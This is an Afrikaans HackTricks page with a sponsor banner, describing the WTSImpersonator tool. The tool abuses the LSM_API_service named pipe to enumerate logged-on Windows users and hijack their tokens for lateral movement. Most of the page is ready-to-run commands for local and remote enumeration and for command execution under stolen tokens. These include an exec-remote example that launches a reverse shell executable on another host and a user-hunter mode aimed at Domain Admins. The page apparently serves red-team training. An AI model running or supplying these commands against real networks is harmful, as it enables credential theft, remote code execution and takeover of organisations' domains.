<details>

<summary><strong>Leer AWS-hacking vanaf nul tot held met</strong> <a href="https://training.hacktricks.xyz/courses/arte"><strong>htARTE (HackTricks AWS Red Team Expert)</strong></a><strong>!</strong></summary>

Ander maniere om HackTricks te ondersteun:

* As jy jou **maatskappy geadverteer wil sien in HackTricks** of **HackTricks in PDF wil aflaai** Kyk na die [**INSKRYWINGSPLANNE**](https://github.com/sponsors/carlospolop)!
* Kry die [**amptelike PEASS & HackTricks swag**](https://peass.creator-spring.com)
* Ontdek [**Die PEASS-familie**](https://opensea.io/collection/the-peass-family), ons versameling eksklusiewe [**NFT's**](https://opensea.io/collection/the-peass-family)
* **Sluit aan by die** 💬 [**Discord-groep**](https://discord.gg/hRep4RUj7f) of die [**telegram-groep**](https://t.me/peass) of **volg** ons op **Twitter** 🐦 [**@carlospolopm**](https://twitter.com/hacktricks_live)**.**
* **Deel jou haktruuks deur PR's in te dien by die** [**HackTricks**](https://github.com/carlospolop/hacktricks) en [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) github-opslag.

</details>

Die **WTS Impersonator**-werktuig maak gebruik van die **"\\pipe\LSM_API_service"** RPC Genoemde pyp om stiekem ingeteken gebruikers te ontleed en hul tokens te kaap, deur tradisionele Token Impersonation-tegnieke te omseil. Hierdie benadering fasiliteer naatlose laterale bewegings binne netwerke. Die innovasie agter hierdie tegniek word toegeskryf aan **Omri Baso, wie se werk toeganklik is op [GitHub](https://github.com/OmriBaso/WTSImpersonator)**.

### Kernfunksionaliteit
Die werktuig werk deur 'n reeks API-oproepe:
```powershell
WTSEnumerateSessionsA → WTSQuerySessionInformationA → WTSQueryUserToken → CreateProcessAsUserW
```
### Sleutelmodules en Gebruik
- **Gebruikers Enumereren**: Plaaslike en afgeleë gebruikersenumerasie is moontlik met die instrument, deur opdragte vir beide scenario's te gebruik:
- Plaaslik:
```powershell
.\WTSImpersonator.exe -m enum
```
- Afgeleë, deur 'n IP-adres of gasheernaam te spesifiseer:
```powershell
.\WTSImpersonator.exe -m enum -s 192.168.40.131
```

- **Opdragte Uitvoer**: Die `exec` en `exec-remote` modules vereis 'n **Diens** konteks om te funksioneer. Plaaslike uitvoering benodig eenvoudig die WTSImpersonator uitvoerbare lêer en 'n opdrag:
- Voorbeeld vir plaaslike opdraguitvoering:
```powershell
.\WTSImpersonator.exe -m exec -s 3 -c C:\Windows\System32\cmd.exe
```
- PsExec64.exe kan gebruik word om 'n dienskonteks te verkry:
```powershell
.\PsExec64.exe -accepteula -s cmd.exe
```

- **Afgeleë Opdraguitvoering**: Behels die skep en installeer van 'n diens afgeleë soortgelyk aan PsExec.exe, wat uitvoering met toepaslike regte moontlik maak.
- Voorbeeld van afgeleë uitvoering:
```powershell
.\WTSImpersonator.exe -m exec-remote -s 192.168.40.129 -c .\SimpleReverseShellExample.exe -sp .\WTSService.exe -id 2
```

- **Gebruikerjagmodule**: Teiken spesifieke gebruikers oor verskeie masjiene, voer kode uit onder hul geloofsbriewe. Dit is veral nuttig om te mik vir Domein Admins met plaaslike administrateursregte op verskeie stelsels.
- Gebruik voorbeeld:
```powershell
.\WTSImpersonator.exe -m user-hunter -uh DOMAIN/USER -ipl .\IPsList.txt -c .\ExeToExecute.exe -sp .\WTServiceBinary.exe
```
